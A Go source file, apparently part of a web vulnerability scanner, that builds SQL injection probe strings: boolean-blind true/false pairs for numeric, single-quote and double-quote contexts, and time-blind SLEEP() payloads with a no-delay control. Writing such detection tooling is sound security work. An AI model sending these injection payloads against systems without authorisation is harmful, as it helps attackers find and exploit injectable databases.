package sqli

// boolPair 是一组布尔差分 payload。
//
// trueValue 应让查询保持原有结果集，falseValue 应让结果集为空。两者只差一个
// 恒真/恒假条件，这是布尔盲注判定的基础。
type boolPair struct {
	// label 用于 Evidence，说明这组 payload 的闭合方式。
	label      string
	trueValue  string
	falseValue string
}

// commentTail 是各主流数据库都兼容的行内注释。
// MySQL 要求 "--" 后必须跟空白字符，因此写成 "-- -"。
const commentTail = "-- -"

// boolPairs 针对同一个原始值生成多种闭合方式的布尔差分候选。
//
// 只覆盖数字型、单引号、双引号三种最常见上下文。更多闭合方式（括号、LIKE、
// 多字节编码等）会成倍放大重放流量，与「网络友好」冲突，留待后续按需扩展。
func boolPairs(orig string) []boolPair {
	return []boolPair{
		{
			label:      "numeric",
			trueValue:  orig + " AND 1=1" + commentTail,
			falseValue: orig + " AND 1=2" + commentTail,
		},
		{
			label:      "single-quote",
			trueValue:  orig + "' AND '1'='1'" + commentTail,
			falseValue: orig + "' AND '1'='2'" + commentTail,
		},
		{
			label:      "double-quote",
			trueValue:  orig + "\" AND \"1\"=\"1\"" + commentTail,
			falseValue: orig + "\" AND \"1\"=\"2\"" + commentTail,
		},
	}
}

// timePairs 生成时间盲注候选：trueValue 触发延时，falseValue 语法等价但不延时。
//
// 对照组是时间盲注不可或缺的一环——没有它就无法区分「注入生效」与「目标本来就慢」。
func timePairs(orig string, seconds int) []boolPair {
	sleep := itoa(seconds)
	return []boolPair{
		{
			label:      "time-single-quote",
			trueValue:  orig + "' AND SLEEP(" + sleep + ")" + commentTail,
			falseValue: orig + "' AND SLEEP(0)" + commentTail,
		},
		{
			label:      "time-numeric",
			trueValue:  orig + " AND SLEEP(" + sleep + ")" + commentTail,
			falseValue: orig + " AND SLEEP(0)" + commentTail,
		},
	}
}

func itoa(n int) string {
	if n <= 0 {
		return "0"
	}
	var buf [8]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}
